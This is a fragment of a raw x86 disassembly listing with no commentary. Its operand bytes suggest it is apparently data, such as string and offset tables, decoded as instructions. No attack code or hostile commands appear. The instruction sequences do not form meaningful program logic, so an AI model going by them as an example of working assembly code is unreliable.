  427530:	adc    DWORD PTR [edx],esi
  427532:	mov    BYTE PTR [eax],bl
	...
  427594:	cmp    ebp,DWORD PTR [eax+edx*1]
  427597:	add    BYTE PTR [esi+0x5c001070],ch
  42759d:	and    edx,DWORD PTR [eax]
  42759f:	add    BYTE PTR [eax+0x1b],dh
  4275a2:	adc    BYTE PTR [eax],al
  4275a4:	dec    ebp
  4275a5:	adc    dl,BYTE PTR [eax]
  4275a7:	add    BYTE PTR [ebx],bl
  4275a9:	and    dl,BYTE PTR [eax]
  4275ab:	add    BYTE PTR [ecx+0x20],dh
  4275ae:	adc    BYTE PTR [eax],al
  4275b0:	cmp    edx,DWORD PTR gs:[eax]
  4275b3:	add    BYTE PTR [ebx+0x51],dl
  4275b6:	push   esi
  4275b7:	aaa    
  4275b8:	pop    edi
  4275b9:	dec    esp
  4275ba:	push   ebp
  4275bb:	ss push ebp
  4275bd:	pop    edi
  4275be:	xor    al,0x43
  4275c0:	aaa    
  4275c1:	dec    edi
  4275c2:	inc    ecx
  4275c3:	add    BYTE PTR [ebx+0x30],al
  4275c6:	xor    eax,0x47475f30
  4275cb:	push   ecx
  4275cc:	push   ebp
  4275cd:	push   ebx
  4275ce:	pop    edi
  4275cf:	xor    DWORD PTR [edx],esi
  4275d1:	inc    edi
  4275d2:	add    BYTE PTR [edi+0x45],al
  4275d5:	push   ebp
  4275d6:	pop    edi
  4275d7:	push   eax
  4275d8:	push   edx
  4275d9:	inc    ebp
  4275da:	pop    edx
  4275db:	xor    BYTE PTR [edi+0x34],bl
  4275de:	dec    edx
  4275df:	add    BYTE PTR [edx+0x4b],cl
  4275e2:	inc    edi
  4275e3:	ss pop edi
  4275e5:	push   edx
  4275e6:	dec    ecx
  4275e7:	dec    edi
  4275e8:	pop    edi
  4275e9:	push   ebp
  4275ea:	xor    dl,BYTE PTR [edi+0x0]
  4275ed:	push   edi
  4275ee:	cmp    BYTE PTR [ecx],dh
  4275f0:	pop    edi
  4275f1:	xor    eax,0x505357
  4275f6:	dec    ebx
  4275f7:	inc    esp
  4275f8:	aaa    
  4275f9:	pop    edi
  4275fa:	inc    esp
  4275fb:	cmp    BYTE PTR [eax+esi*1+0x34],dl
  4275ff:	pop    edi
  427600:	push   esi
  427601:	add    BYTE PTR [edx+ebx*2+0x42],dl
  427605:	pop    edi
  427606:	push   ebp
  427607:	push   edx
  427608:	inc    esi
  427609:	inc    ebx
  42760a:	dec    esi
  42760b:	xor    eax,DWORD PTR [eax]
  42760d:	inc    ebx
  42760e:	cmp    DWORD PTR [edx+0x5f],eax
  427611:	inc    esi
  427612:	pop    edx
  427613:	push   esi
  427614:	cmp    BYTE PTR [edi+0x4a],bl
  427617:	add    BYTE PTR [ecx+0x38],al
  42761a:	xor    ebx,DWORD PTR [edi+0x52]
  42761d:	push   ebx
  42761e:	pop    ecx
  42761f:	inc    esi
  427620:	xor    al,0x5f
  427622:	xor    eax,0x5a005157
  427627:	push   ebp
  427628:	xor    dh,BYTE PTR [esi]
  42762a:	xor    bl,BYTE PTR [edi+0x33]
  42762d:	inc    esp
  42762e:	push   esi
  42762f:	dec    esp
  427630:	push   ebx
  427631:	pop    edi
  427632:	xor    al,0x0
  427634:	push   ebx
  427635:	cmp    DWORD PTR [ebp+0x33],eax
  427638:	cmp    BYTE PTR [edi+0x59],bl
  42763b:	xor    DWORD PTR [edi+ebx*2+0x46],eax
  42763f:	dec    ebx
  427640:	cmp    DWORD PTR [edx+ebx*2+0x0],ecx
  427644:	inc    esi
  427645:	xor    al,0x48
  427647:	pop    edi
  427648:	xor    ecx,DWORD PTR [eax+0x37]
  42764b:	cmp    DWORD PTR [edi+0x37],ebx
  42764e:	dec    esi
  42764f:	xor    al,0x51
  427651:	add    BYTE PTR [ebx+0x56],dl
  427654:	push   esp
  427655:	pop    edi
  427656:	xor    al,0x37
  427658:	xor    eax,0x325f3353
  42765d:	add    BYTE PTR [eax+0x59],bl
  427660:	inc    esp
  427661:	pop    edi
  427662:	dec    ebx
  427663:	push   esp
  427664:	dec    esp
  427665:	inc    esp
  427666:	pop    edi
  427667:	cmp    DWORD PTR [eax],eax
  427669:	push   edi
  42766a:	dec    eax
  42766b:	push   edi
  42766c:	pop    edi
  42766d:	inc    ebp
  42766e:	dec    esp
  42766f:	inc    ecx
  427670:	xor    DWORD PTR [edi+0x47],ebx
  427673:	add    BYTE PTR [edx+eax*2+0x51],dl
  427677:	pop    edi
  427678:	xor    eax,0x5137385a
  42767d:	xor    eax,0x574d5400
  427682:	pop    edi
  427683:	xor    DWORD PTR [edx+ebx*2+0x53],edx
  427687:	pop    edi
  427688:	pop    eax
  427689:	xor    BYTE PTR [ecx+0x5f],cl
  42768c:	xor    eax,0x33420030
  427691:	xor    al,0x32
  427693:	xor    DWORD PTR [edi+0x58],ebx
  427696:	inc    ecx
  427697:	dec    esi
  427698:	pop    edi
  427699:	inc    edx
  42769a:	push   ebp
  42769b:	push   ecx
  42769c:	add    BYTE PTR [ebp+0x31],al
  42769f:	ss pop edi
  4276a1:	xor    BYTE PTR [eax+0x4c],cl
  4276a4:	pop    edi
  4276a5:	cmp    DWORD PTR [ebp+0x53],edx
  4276a8:	add    BYTE PTR [ebp+0x41],al
  4276ab:	dec    eax
  4276ac:	cmp    BYTE PTR [edi+0x35],bl
  4276af:	dec    esi
  4276b0:	push   ebx
  4276b1:	dec    ebx
  4276b2:	add    BYTE PTR [edi+0x38],dl
  4276b5:	xor    DWORD PTR [edi+0x48],ebx
  4276b8:	xor    DWORD PTR [ebp+0x4e],eax
  4276bb:	ss pop edi
  4276bd:	dec    eax
  4276be:	cmp    DWORD PTR [edx+0x0],eax
  4276c1:	push   esp
  4276c2:	aaa    
  4276c3:	xor    bh,BYTE PTR [ecx]
  4276c5:	xor    al,0x31
  4276c7:	pop    edi
  4276c8:	push   edx
  4276c9:	push   edi
  4276ca:	push   edx
  4276cb:	dec    ecx
  4276cc:	add    BYTE PTR [esi+0x4d],al
  4276cf:	push   edi
  4276d0:	pop    edi
  4276d1:	pop    ecx
  4276d2:	xor    eax,0x45395a
  4276d7:	pop    eax
  4276d8:	dec    eax
  4276d9:	aaa    
  4276da:	pop    edi
  4276db:	xor    dl,BYTE PTR [ebx+0x39]
  4276de:	xor    dh,BYTE PTR [esi]
  4276e0:	xor    eax,0x3936525f
  4276e5:	add    BYTE PTR [ebx+0x50],cl
  4276e8:	inc    ecx
  4276e9:	pop    edi
  4276ea:	xor    eax,0x364c3737
  4276ef:	xor    BYTE PTR [ecx+0x0],dl
  4276f2:	push   ebx
  4276f3:	push   ebx
  4276f4:	inc    ebx
  4276f5:	xor    bl,BYTE PTR [edi+0x57]
  4276f8:	xor    BYTE PTR [ecx+0x43],al
  4276fb:	push   esp
  4276fc:	xor    eax,0x414a004e
  427701:	inc    ecx
  427702:	pop    edi
  427703:	cmp    DWORD PTR [esi+0x32],edx
  427706:	pop    edi
  427707:	xor    bh,BYTE PTR [ecx]
  427709:	add    BYTE PTR [ebx+0x42],cl
  42770c:	dec    esp
  42770d:	pop    edi
  42770e:	push   esi
  42770f:	xor    eax,0x47004c55
  427714:	xor    ecx,DWORD PTR [eax+0x5f]
  427717:	push   ecx
  427718:	dec    edi
  427719:	push   esp
  42771a:	cmp    BYTE PTR [eax+0x5f],dl
  42771d:	dec    ecx
  42771e:	add    BYTE PTR [ebp+0x33],cl
  427721:	inc    ebp
  427722:	pop    edi
  427723:	inc    edi
  427724:	dec    edi
  427725:	xor    eax,0x455f3249
  42772a:	add    BYTE PTR [edx+0x47],cl
  42772d:	xor    eax,0x4338535f
  427732:	dec    ecx
  427733:	xor    dh,BYTE PTR [eax]
  427735:	pop    edi
  427736:	push   eax
  427737:	add    BYTE PTR [eax+0x0],dl
  42773a:	pop    eax
  42773b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42773f:	add    BYTE PTR [eax+0x0],cl
  427742:	aaa    
  427743:	add    BYTE PTR [ecx+0x0],bl
  427746:	aaa    
  427747:	add    BYTE PTR [edi+0x0],bl
  42774a:	inc    esi
  42774b:	add    BYTE PTR [edi],dh
  42774d:	add    BYTE PTR [ecx+0x0],bl
  427750:	inc    esp
  427751:	add    BYTE PTR [edi+0x0],bl
  427754:	xor    eax,0x52000000
  427759:	add    BYTE PTR [eax+0x0],dl
  42775c:	inc    esi
  42775d:	add    BYTE PTR [edi+0x0],bl
  427760:	dec    esp
  427761:	add    BYTE PTR [ecx+0x0],al
  427764:	push   eax
  427765:	add    BYTE PTR [edi+0x0],bl
  427768:	inc    ecx
  427769:	add    BYTE PTR [edi],dh
  42776b:	add    BYTE PTR [eax+eax*1+0x4a],al
  42776f:	add    BYTE PTR [ebp+0x0],al
  427772:	pop    edi
  427773:	add    BYTE PTR [eax+eax*1],dh
  427776:	add    BYTE PTR [eax],al
  427778:	dec    esp
  427779:	add    BYTE PTR [edi],dh
  42777b:	add    BYTE PTR [ebp+0x0],cl
  42777e:	cmp    BYTE PTR [eax],al
  427780:	xor    al,BYTE PTR [eax]
  427782:	pop    edi
  427783:	add    BYTE PTR [eax],bh
  427785:	add    BYTE PTR [ecx+0x0],al
  427788:	pop    edx
  427789:	add    BYTE PTR [edx+0x0],bl
  42778c:	pop    edi
  42778d:	add    BYTE PTR [ebx],dh
  42778f:	add    BYTE PTR [ebx+0x0],dl
  427792:	add    BYTE PTR [eax],al
  427794:	push   esi
  427795:	add    BYTE PTR [eax],bh
  427797:	add    BYTE PTR [esi+0x0],dl
  42779a:	xor    al,BYTE PTR [eax]
  42779c:	pop    edi
  42779d:	add    BYTE PTR [esi+0x0],al
  4277a0:	inc    ebx
  4277a1:	add    BYTE PTR [edi+0x0],al
  4277a4:	push   edi
  4277a5:	add    BYTE PTR [edi+0x0],bl
  4277a8:	dec    eax
  4277a9:	add    BYTE PTR [edx+0x0],cl
  4277ac:	cmp    DWORD PTR [eax],eax
  4277ae:	aaa    
  4277af:	add    BYTE PTR [eax],al
  4277b1:	add    BYTE PTR [ecx+0x0],cl
  4277b4:	dec    edx
  4277b5:	add    BYTE PTR [ecx+0x0],al
  4277b8:	pop    edi
  4277b9:	add    BYTE PTR [edx+0x0],cl
  4277bc:	inc    esi
  4277bd:	add    BYTE PTR [edi+0x0],dl
  4277c0:	xor    eax,DWORD PTR [eax]
  4277c2:	dec    ebp
  4277c3:	add    BYTE PTR [edi+0x0],bl
  4277c6:	push   eax
  4277c7:	add    BYTE PTR [ecx+0x0],al
  4277ca:	add    BYTE PTR [eax],al
  4277cc:	dec    edi
  4277cd:	add    BYTE PTR [ecx+0x0],bl
  4277d0:	dec    eax
  4277d1:	add    BYTE PTR [edi+0x0],bl
  4277d4:	xor    eax,0x33005000
  4277d9:	add    BYTE PTR [esi+0x0],al
  4277dc:	push   esi
  4277dd:	add    BYTE PTR [edi+0x0],bl
  4277e0:	push   ebx
  4277e1:	add    BYTE PTR [ecx+0x0],dl
  4277e4:	push   ebp
  4277e5:	add    BYTE PTR [eax],al
  4277e7:	add    BYTE PTR [esi+0x0],al
  4277ea:	dec    esp
  4277eb:	add    BYTE PTR [ecx],dh
  4277ed:	add    BYTE PTR [edi+0x0],bl
  4277f0:	dec    ebx
  4277f1:	add    BYTE PTR [edx+0x0],dl
  4277f4:	inc    ebx
  4277f5:	add    BYTE PTR [edi+0x0],bl
  4277f8:	dec    edx
  4277f9:	add    BYTE PTR [eax],bh
  4277fb:	add    BYTE PTR [esi+0x0],dl
  4277fe:	cmp    DWORD PTR [eax],eax
  427800:	cmp    DWORD PTR [eax],eax
  427802:	add    BYTE PTR [eax],al
  427804:	dec    eax
  427805:	add    BYTE PTR [ecx+0x0],bl
  427808:	push   edx
  427809:	add    BYTE PTR [edi+0x0],bl
  42780c:	inc    esp
  42780d:	add    BYTE PTR [ebx+0x0],dl
  427810:	dec    edx
  427811:	add    BYTE PTR [ebx],dh
  427813:	add    BYTE PTR [eax],al
  427815:	add    BYTE PTR [eax+eax*1+0x5a],dl
  427819:	add    BYTE PTR [ecx+0x0],dl
  42781c:	pop    edi
  42781d:	add    BYTE PTR [ebx+0x0],dl
  427820:	cmp    BYTE PTR [eax],al
  427822:	dec    ebx
  427823:	add    BYTE PTR [eax+eax*1],dh
  427826:	xor    al,BYTE PTR [eax]
  427828:	add    BYTE PTR [eax],al
  42782a:	dec    ecx
  42782b:	add    BYTE PTR [eax+0x0],dl
  42782e:	xor    BYTE PTR [eax],al
  427830:	add    BYTE PTR ss:[edi+0x0],bl
  427834:	inc    esi
  427835:	add    BYTE PTR [ebp+0x0],dl
  427838:	inc    edx
  427839:	add    BYTE PTR [eax],al
  42783b:	add    BYTE PTR [edx+0x0],bl
  42783e:	xor    eax,DWORD PTR [eax]
  427840:	inc    ecx
  427841:	add    BYTE PTR [edi],dh
  427843:	add    BYTE PTR [edi+0x0],bl
  427846:	inc    edi
  427847:	add    BYTE PTR [edx+0x0],bl
  42784a:	xor    BYTE PTR [eax],al
  42784c:	push   edx
  42784d:	add    BYTE PTR [edi+0x0],bl
  427850:	aaa    
  427851:	add    BYTE PTR [edx+0x0],dl
  427854:	push   eax
  427855:	add    BYTE PTR [esi+0x0],cl
  427858:	dec    esi
  427859:	add    BYTE PTR [eax],al
  42785b:	add    BYTE PTR [eax+0x0],dl
  42785e:	cmp    DWORD PTR [eax],eax
  427860:	cmp    DWORD PTR [eax],eax
  427862:	xor    eax,DWORD PTR [eax]
  427864:	xor    al,0x0
  427866:	xor    eax,0x36003700
  42786b:	add    BYTE PTR ds:0x41005f00,dh
  427871:	add    BYTE PTR [ecx+0x0],al
  427874:	add    BYTE PTR [eax],al
  427876:	dec    edx
  427877:	add    BYTE PTR [esi+0x0],cl
  42787a:	pop    eax
  42787b:	add    BYTE PTR [edi+0x0],bl
  42787e:	inc    edi
  42787f:	add    BYTE PTR [ecx],bh
  427881:	add    BYTE PTR [edx+0x0],al
  427884:	pop    edx
  427885:	add    BYTE PTR [ebp+0x0],cl
  427888:	pop    edi
  427889:	add    BYTE PTR [ecx+0x0],dl
  42788c:	inc    ebp
  42788d:	add    BYTE PTR [ebp+0x0],dl
  427890:	add    BYTE PTR [eax],al
  427892:	push   eax
  427893:	add    BYTE PTR [eax+eax*1+0x38],al
  427897:	add    BYTE PTR [esi],dh
  427899:	add    BYTE PTR [edi+0x0],bl
  42789c:	xor    al,BYTE PTR [eax]
  42789e:	dec    eax
  42789f:	add    BYTE PTR [esi+0x0],cl
  4278a2:	dec    ecx
  4278a3:	add    BYTE PTR [eax],al
  4278a5:	add    BYTE PTR [eax],al
  4278a7:	xchg   esp,eax
  4278a8:	jne    0x4278ec
  4278aa:	add    BYTE PTR [eax-0x63ffbd8b],bl
  4278b0:	jne    0x4278f4
  4278b2:	add    BYTE PTR [eax-0x5bffbd8b],ah
  4278b8:	jne    0x4278fc
  4278ba:	add    BYTE PTR [eax-0x53ffbd8b],ch
  4278c0:	jne    0x427904
  4278c2:	add    BYTE PTR [eax+0x4275],dh
  4278c8:	add    BYTE PTR [eax],al
  4278ca:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  4278ce:	dec    ebp
  4278cf:	add    BYTE PTR [eax],al
  4278d1:	add    BYTE PTR [eax],al
  4278d3:	add    al,BYTE PTR [eax]
  4278d5:	add    BYTE PTR [eax],al
  4278d7:	inc    edx
  4278d8:	add    BYTE PTR [eax],al
  4278da:	add    BYTE PTR [eax],al
  4278dc:	loopne 0x4278de
  4278de:	add    BYTE PTR [eax],al
  4278e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278e1:	add    BYTE PTR [eax],al
  4278e3:	add    BYTE PTR [eax],al
  4278e5:	add    BYTE PTR [eax],al
  4278e7:	aas    
  4278e8:	add    BYTE PTR [edx],0x0
  4278eb:	push   ecx
  4278ec:	add    BYTE PTR [edx],0x0
  4278ef:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  4278f9:	add    al,BYTE PTR [eax]
  4278fb:	stos   DWORD PTR es:[edi],eax
  4278fc:	add    BYTE PTR [edx],0x0
  4278ff:	add    BYTE PTR [eax],al
  427901:	add    BYTE PTR [eax],al
  427903:	rol    DWORD PTR [edx-0x7d20fffe],1
  427909:	add    al,BYTE PTR [eax]
  42790b:	jmp    0xf3427b92
  427910:	add    BYTE PTR [edx],0x0
  427913:	std    
  427914:	add    BYTE PTR [edx],0x0
  427917:	jae    0x835f791f
  42791d:	add    al,BYTE PTR [eax]
  42791f:	and    eax,0x35000283
  427924:	add    DWORD PTR [edx],0x0
  427927:	aas    
  427928:	add    DWORD PTR [edx],0x0
  42792b:	dec    ecx
  42792c:	add    DWORD PTR [edx],0x0
  42792f:	push   ebx
  427930:	add    DWORD PTR [edx],0x0
  427933:	pop    ebp
  427934:	add    DWORD PTR [edx],0x0
  427937:	add    DWORD PTR [bp+si],0x0
  42793b:	jno    0x4278c0
  42793d:	add    al,BYTE PTR [eax]
  42793f:	jns    0x4278c4
  427941:	add    al,BYTE PTR [eax]
  427943:	add    DWORD PTR [ebx-0x7c74fffe],0x83950002
  42794d:	add    al,BYTE PTR [eax]
  42794f:	lahf   
  427950:	add    DWORD PTR [edx],0x0
  427953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427954:	add    DWORD PTR [edx],0x0
  427957:	mov    ch,0x83
  427959:	add    al,BYTE PTR [eax]
  42795b:	rol    DWORD PTR [ebx-0x7c32fffe],0x2
  427962:	add    cl,bl
  427964:	add    DWORD PTR [edx],0x0
  427967:	jecxz  0x4278ec
  427969:	add    al,BYTE PTR [eax]
  42796b:	out    dx,eax
  42796c:	add    DWORD PTR [edx],0x0
  42796f:	std    
  427970:	add    DWORD PTR [edx],0x0
  427973:	pop    es
  427974:	test   BYTE PTR [edx],al
  427976:	add    BYTE PTR [ecx],dl
  427978:	test   BYTE PTR [edx],al
  42797a:	add    BYTE PTR [edi],bl
  42797c:	test   BYTE PTR [edx],al
  42797e:	add    BYTE PTR [edi],ah
  427980:	test   BYTE PTR [edx],al
  427982:	add    BYTE PTR [ecx],dh
  427984:	test   BYTE PTR [edx],al
  427986:	add    BYTE PTR [ebx],bh
  427988:	test   BYTE PTR [edx],al
  42798a:	add    BYTE PTR [ebp-0x7c],al
  42798d:	add    al,BYTE PTR [eax]
  42798f:	dec    ebp
  427990:	test   BYTE PTR [edx],al
  427992:	add    BYTE PTR [edi-0x7c],dl
  427995:	add    al,BYTE PTR [eax]
  427997:	popa   
  427998:	test   BYTE PTR [edx],al
  42799a:	add    BYTE PTR [ebx-0x7c],ch
  42799d:	add    al,BYTE PTR [eax]
  42799f:	jg     0x427925
  4279a1:	add    al,BYTE PTR [eax]
  4279a3:	mov    DWORD PTR [edx+eax*1+0x2849300],eax
  4279aa:	add    BYTE PTR [ebx-0x54fffd7c],bl
  4279b0:	test   BYTE PTR [edx],al
  4279b2:	add    BYTE PTR [eax],al
  4279b4:	add    BYTE PTR [eax],al
  4279b6:	add    cl,al
  4279b8:	test   BYTE PTR [edx],al
  4279ba:	add    cl,bl
  4279bc:	test   BYTE PTR [edx],al
  4279be:	add    bh,ah
  4279c0:	test   BYTE PTR [edx],al
  4279c2:	add    bl,bh
  4279c4:	test   BYTE PTR [edx],al
  4279c6:	add    BYTE PTR ds:0x1d000285,cl
  4279cc:	test   DWORD PTR [edx],eax
  4279ce:	add    BYTE PTR [edi],ch
  4279d0:	test   DWORD PTR [edx],eax
  4279d2:	add    BYTE PTR ds:0x51000285,bh
  4279d8:	test   DWORD PTR [edx],eax
  4279da:	add    BYTE PTR [ecx-0x7b],ah
  4279dd:	add    al,BYTE PTR [eax]
  4279df:	ja     0x427966
  4279e1:	add    al,BYTE PTR [eax]
  4279e3:	mov    eax,DWORD PTR [ebp-0x7a64fffe]
  4279e9:	add    al,BYTE PTR [eax]
  4279eb:	mov    ds:0xb9000285,eax
  4279f0:	test   DWORD PTR [edx],eax
  4279f2:	add    cl,cl
  4279f4:	test   DWORD PTR [edx],eax
  4279f6:	add    ch,dl
  4279f8:	test   DWORD PTR [edx],eax
  4279fa:	add    bh,ah
  4279fc:	test   DWORD PTR [edx],eax
  4279fe:	add    cl,dh
  427a00:	test   DWORD PTR [edx],eax
  427a02:	add    BYTE PTR [ebx],cl
  427a04:	xchg   BYTE PTR [edx],al
  427a06:	add    BYTE PTR [ecx],ah
  427a08:	xchg   BYTE PTR [edx],al
  427a0a:	add    BYTE PTR ds:0x45000286,dh
  427a10:	xchg   BYTE PTR [edx],al
  427a12:	add    BYTE PTR [ecx-0x7a],dl
  427a15:	add    al,BYTE PTR [eax]
  427a17:	popa   
  427a18:	xchg   BYTE PTR [edx],al
  427a1a:	add    BYTE PTR [ebp-0x7a],ch
  427a1d:	add    al,BYTE PTR [eax]
  427a1f:	jg     0x4279a7
  427a21:	add    al,BYTE PTR [eax]
  427a23:	lea    eax,[esi-0x7964fffe]
  427a29:	add    al,BYTE PTR [eax]
  427a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a2c:	xchg   BYTE PTR [edx],al
  427a2e:	add    BYTE PTR [ecx-0x32fffd7a],bh
  427a34:	xchg   BYTE PTR [edx],al
  427a36:	add    cl,bl
  427a38:	xchg   BYTE PTR [edx],al
  427a3a:	add    ch,ch
  427a3c:	xchg   BYTE PTR [edx],al
  427a3e:	add    bl,bh
  427a40:	xchg   BYTE PTR [edx],al
  427a42:	add    BYTE PTR ds:0x1d000287,cl
  427a48:	xchg   DWORD PTR [edx],eax
  427a4a:	add    BYTE PTR [ebx],ch
  427a4c:	xchg   DWORD PTR [edx],eax
  427a4e:	add    BYTE PTR [ecx-0x79],al
  427a51:	add    al,BYTE PTR [eax]
  427a53:	dec    ebp
  427a54:	xchg   DWORD PTR [edx],eax
  427a56:	add    BYTE PTR [ebx-0x79],ah
  427a59:	add    al,BYTE PTR [eax]
  427a5b:	jg     0x4279e4
  427a5d:	add    al,BYTE PTR [eax]
  427a5f:	xchg   ebx,eax
  427a60:	xchg   DWORD PTR [edx],eax
  427a62:	add    BYTE PTR [edi-0x44fffd79],ah
  427a68:	xchg   DWORD PTR [edx],eax
  427a6a:	add    cl,dl
  427a6c:	xchg   DWORD PTR [edx],eax
  427a6e:	add    cl,ch
  427a70:	xchg   DWORD PTR [edx],eax
  427a72:	add    bh,dh
  427a74:	xchg   DWORD PTR [edx],eax
  427a76:	add    BYTE PTR [ecx],cl
  427a78:	mov    BYTE PTR [edx],al
  427a7a:	add    BYTE PTR [edi],bl
  427a7c:	mov    BYTE PTR [edx],al
  427a7e:	add    BYTE PTR [ecx],dh
  427a80:	mov    BYTE PTR [edx],al
  427a82:	add    BYTE PTR [ebp-0x78],al
  427a85:	add    al,BYTE PTR [eax]
  427a87:	add    BYTE PTR [eax],al
  427a89:	add    BYTE PTR [eax],al
  427a8b:	mov    BYTE PTR gs:[edx],al
  427a8e:	add    BYTE PTR [ebx-0x78],dh
  427a91:	add    al,BYTE PTR [eax]
  427a93:	test   DWORD PTR [eax-0x7768fffe],ecx
  427a99:	add    al,BYTE PTR [eax]
  427a9b:	mov    ds:0xb5000288,eax
  427aa0:	mov    BYTE PTR [edx],al
  427aa2:	add    bh,al
  427aa4:	mov    BYTE PTR [edx],al
  427aa6:	add    bl,bl
  427aa8:	mov    BYTE PTR [edx],al
  427aaa:	add    bh,ah
  427aac:	mov    BYTE PTR [edx],al
  427aae:	add    ch,dh
  427ab0:	mov    BYTE PTR [edx],al
  427ab2:	add    BYTE PTR [ecx],al
  427ab4:	mov    DWORD PTR [edx],eax
  427ab6:	add    BYTE PTR [ebx],dl
  427ab8:	mov    DWORD PTR [edx],eax
  427aba:	add    BYTE PTR [ecx],ah
  427abc:	mov    DWORD PTR [edx],eax
  427abe:	add    BYTE PTR [edi],ch
  427ac0:	mov    DWORD PTR [edx],eax
  427ac2:	add    BYTE PTR [ebx-0x77],cl
  427ac5:	add    al,BYTE PTR [eax]
  427ac7:	pop    ebx
  427ac8:	mov    DWORD PTR [edx],eax
  427aca:	add    BYTE PTR [ebp-0x77],dh
  427acd:	add    al,BYTE PTR [eax]
  427acf:	test   DWORD PTR [ecx-0x7664fffe],ecx
  427ad5:	add    al,BYTE PTR [eax]
  427ad7:	stos   DWORD PTR es:[edi],eax
  427ad8:	mov    DWORD PTR [edx],eax
  427ada:	add    BYTE PTR [edi-0x34fffd77],dh
  427ae0:	mov    DWORD PTR [edx],eax
  427ae2:	add    bl,ah
  427ae4:	mov    DWORD PTR [edx],eax
  427ae6:	add    bh,ch
  427ae8:	mov    DWORD PTR [edx],eax
  427aea:	add    bh,bh
  427aec:	mov    DWORD PTR [edx],eax
  427aee:	add    BYTE PTR [ebx],cl
  427af0:	mov    al,BYTE PTR [edx]
  427af2:	add    BYTE PTR [edi],dl
  427af4:	mov    al,BYTE PTR [edx]
  427af6:	add    BYTE PTR ds:0x2f00028a,ah
  427afc:	mov    al,BYTE PTR [edx]
  427afe:	add    BYTE PTR [edi],bh
  427b00:	mov    al,BYTE PTR [edx]
  427b02:	add    BYTE PTR [ecx-0x76],dl
  427b05:	add    al,BYTE PTR [eax]
  427b07:	pop    ebp
  427b08:	mov    al,BYTE PTR [edx]
  427b0a:	add    BYTE PTR [edi-0x76],ch
  427b0d:	add    al,BYTE PTR [eax]
  427b0f:	jnp    0x427a9b
  427b11:	add    al,BYTE PTR [eax]
  427b13:	xchg   DWORD PTR [edx-0x7568fffe],ecx
  427b19:	add    al,BYTE PTR [eax]
  427b1b:	lods   eax,DWORD PTR ds:[esi]
  427b1c:	mov    al,BYTE PTR [edx]
  427b1e:	add    BYTE PTR [ebx-0x32fffd76],bh
  427b24:	mov    al,BYTE PTR [edx]
  427b26:	add    ch,bl
  427b28:	mov    al,BYTE PTR [edx]
  427b2a:	add    ch,ch
  427b2c:	mov    al,BYTE PTR [edx]
  427b2e:	add    BYTE PTR [ecx],cl
  427b30:	mov    eax,DWORD PTR [edx]
  427b32:	add    BYTE PTR [ecx],bl
  427b34:	mov    eax,DWORD PTR [edx]
  427b36:	add    BYTE PTR [ecx],ch
  427b38:	mov    eax,DWORD PTR [edx]
  427b3a:	add    BYTE PTR [edi],dh
  427b3c:	mov    eax,DWORD PTR [edx]
  427b3e:	add    BYTE PTR [ebp-0x75],cl
  427b41:	add    al,BYTE PTR [eax]
  427b43:	pop    ebx
  427b44:	mov    eax,DWORD PTR [edx]
  427b46:	add    BYTE PTR [ebp-0x75],ah
  427b49:	add    al,BYTE PTR [eax]
  427b4b:	jno    0x427ad8
  427b4d:	add    al,BYTE PTR [eax]
  427b4f:	or     DWORD PTR [ebx-0x7464fffe],0x2
  427b56:	add    BYTE PTR [ebp-0x42fffd75],ch
  427b5c:	mov    eax,DWORD PTR [edx]
  427b5e:	add    cl,dl
  427b60:	mov    eax,DWORD PTR [edx]
  427b62:	add    cl,ah
  427b64:	mov    eax,DWORD PTR [edx]
  427b66:	add    bh,dh
  427b68:	mov    eax,DWORD PTR [edx]
  427b6a:	add    BYTE PTR ds:0x1900028c,al
  427b70:	mov    WORD PTR [edx],es
  427b72:	add    BYTE PTR [edi],ah
  427b74:	mov    WORD PTR [edx],es
  427b76:	add    BYTE PTR [ecx],bh
  427b78:	mov    WORD PTR [edx],es
  427b7a:	add    BYTE PTR [ebx-0x74],cl
  427b7d:	add    al,BYTE PTR [eax]
  427b7f:	pop    ebp
  427b80:	mov    WORD PTR [edx],es
  427b82:	add    BYTE PTR [ecx-0x74],ch
  427b85:	add    al,BYTE PTR [eax]
  427b87:	ja     0x427b15
  427b89:	add    al,BYTE PTR [eax]
  427b8b:	lea    ecx,[edx+eax*1+0x28ca100]
  427b92:	add    BYTE PTR [ebp-0x38fffd74],dh
  427b98:	mov    WORD PTR [edx],es
  427b9a:	add    cl,dl
  427b9c:	mov    WORD PTR [edx],es
  427b9e:	add    bl,ah
  427ba0:	mov    WORD PTR [edx],es
  427ba2:	add    bh,dh
  427ba4:	mov    WORD PTR [edx],es
  427ba6:	add    BYTE PTR [ebx],cl
  427ba8:	lea    eax,[edx]
  427baa:	add    BYTE PTR [ebx],bl
  427bac:	lea    eax,[edx]
  427bae:	add    BYTE PTR [ecx],ch
  427bb0:	lea    eax,[edx]
  427bb2:	add    BYTE PTR [ebx-0x73],al
  427bb5:	add    al,BYTE PTR [eax]
  427bb7:	pop    ebx
  427bb8:	lea    eax,[edx]
  427bba:	add    BYTE PTR [ecx-0x73],ch
  427bbd:	add    al,BYTE PTR [eax]
  427bbf:	jnp    0x427b4e
  427bc1:	add    al,BYTE PTR [eax]
  427bc3:	mov    DWORD PTR [ebp-0x726afffe],ecx
  427bc9:	add    al,BYTE PTR [eax]
  427bcb:	scas   eax,DWORD PTR es:[edi]
  427bcc:	lea    eax,[edx]
  427bce:	add    cl,al
  427bd0:	lea    eax,[edx]
  427bd2:	add    bl,dl
  427bd4:	lea    eax,[edx]
  427bd6:	add    bl,ah
  427bd8:	lea    eax,[edx]
  427bda:	add    bl,dh
  427bdc:	lea    eax,[edx]
  427bde:	add    ch,bh
  427be0:	lea    eax,[edx]
  427be2:	add    BYTE PTR ds:0x1f00028e,cl
  427be8:	mov    es,WORD PTR [edx]
  427bea:	add    BYTE PTR [edi],ch
  427bec:	mov    es,WORD PTR [edx]
  427bee:	add    BYTE PTR [ebp-0x72],al
  427bf1:	add    al,BYTE PTR [eax]
  427bf3:	pop    ebp
  427bf4:	mov    es,WORD PTR [edx]
  427bf6:	add    BYTE PTR [edi-0x72],ch
  427bf9:	add    al,BYTE PTR [eax]
  427bfb:	jg     0x427b8b
  427bfd:	add    al,BYTE PTR [eax]
  427bff:	xchg   ecx,eax
  427c00:	mov    es,WORD PTR [edx]
  427c02:	add    BYTE PTR [edi-0x4efffd72],bl
  427c08:	mov    es,WORD PTR [edx]
